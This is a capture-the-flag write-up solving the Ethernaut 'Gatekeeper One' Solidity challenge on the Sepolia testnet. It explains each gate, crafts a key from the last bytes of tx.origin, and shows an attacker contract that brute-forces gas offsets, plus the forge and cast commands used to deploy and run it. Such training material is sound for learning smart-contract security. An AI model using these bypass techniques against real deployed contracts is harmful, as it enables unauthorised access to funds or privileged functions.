# Ethernaut Challenge 13 — Gatekeeper One

The goal of this challenge is to pass all the gates and register as the `entrant`.

Instance address:

```
0x2A8613f30D946baf392870bC93a0570808bA25a3
```

---

## 🎯 Goal

Successfully call `enter(bytes8 _gateKey)` and set yourself as the `entrant`.

---

## 🧠 Understanding the challenge

The contract has three modifiers:

### Gate 1

```solidity
require(msg.sender != tx.origin);
```

This enforces that the caller must be a **smart contract**, not an EOA.

👉 Solution: call `enter()` through an attacker contract.

---

### Gate 2

```solidity
require(gasleft() % 8191 == 0);
```

This is the tricky part.

- `gasleft()` depends on runtime execution
- some gas is consumed before reaching this check
- we cannot know this value exactly

So we model it as:

```
gasleft() = gasSent - C
```

Where:
- `gasSent` = gas we provide
- `C` = unknown gas consumed before the check

We rewrite:

```
gasleft() = (BASE + i) - C = K + i
```

So:

```
gasleft() % 8191 = (K + i) % 8191
```

👉 As `i` goes from `0 → 8190`, we cover all possible remainders:

```
0, 1, 2, ..., 8190
```

So one value must satisfy:

```
gasleft() % 8191 == 0
```

👉 Solution: brute force the offset `i`.

---

### Gate 3

```solidity
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
require(uint32(uint64(_gateKey)) != uint64(_gateKey));
require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));
```

We need to carefully craft `_gateKey`.

---

## 🔑 Building the correct key

### Step 1 — Understand casting

- `address` = 20 bytes = 160 bits → `uint160`
- casting to smaller types keeps only lower bits

```solidity
uint16(x) = last 2 bytes
uint32(x) = last 4 bytes
```

---

### Step 2 — Extract last 2 bytes of `tx.origin`

Example:

```
0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0
```

Last 2 bytes:

```
0xb0b0
```

---

### Step 3 — Understand constraints

From:

```solidity
uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
```

👉 last 4 bytes of `_gateKey` must be:

```
0x0000B0B0
```

From:

```solidity
uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
```

👉 last 4 bytes must equal last 2 bytes → forces:

```
0x0000B0B0
```

From:

```solidity
uint32(uint64(_gateKey)) != uint64(_gateKey)
```

👉 upper 4 bytes must be non-zero

---

### ✅ Final key structure

```
0x????????0000B0B0
```

Example:

```
0x123456780000B0B0
```

---

## 🧪 Attacker contract

The attack combines:

- a smart contract call (Gate 1)
- brute force on gas (Gate 2)
- crafted key (Gate 3)

```solidity
function attack() public returns (bool) {
    bytes8 key = computeKey();

    for (uint256 i = 0; i < 8191; i++) {
        uint256 gasSent = 8191 * 3 + i;

        (bool success, bytes memory returnData) =
            address(s_gatekeeper).call{gas: gasSent}(
                abi.encodeCall(s_gatekeeper.enter, (key))
            );

        if (success && abi.decode(returnData, (bool))) {
            return true;
        }
    }

    return false;
}
```

I tested the contract `GatekeeperOneAttacker` inside the test file `GatekeeperOneTest.t.sol`

---

## 🚀 Execute on Sepolia

Deploy the attacker contract:

```bash
GATEKEEPER_ONE_SEPOLIA=0x2A8613f30D946baf392870bC93a0570808bA25a3

forge create src/challenge-13-gatekeeper-one/GatekeeperOneAttacker.sol:GatekeeperOneAttacker \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast \
  --constructor-args $GATEKEEPER_ONE_SEPOLIA
```

Deployed contract:

```
0xEa699Cfc229Ff428DA5105bD7Ea64Ae4175cfD18
```

---

Call the attack:

```bash
GATEKEEPER_ONE_ATTACKER_SEPOLIA=0xEa699Cfc229Ff428DA5105bD7Ea64Ae4175cfD18

cast send $GATEKEEPER_ONE_ATTACKER_SEPOLIA \
    "attack()" \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Transaction hash:

```
0xf0efffcd71d5bff7aea70e16c4c8a81ed4a0d84a8a2e2c5286b12a45640278cb
```

---

## ✅ Verify

```bash
cast call $GATEKEEPER_ONE_SEPOLIA \
    "entrant()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0x000000000000000000000000ecf94300dd67bb8c31f41be3a2136d3f0abfb0b0
```

Challenge solved ✅

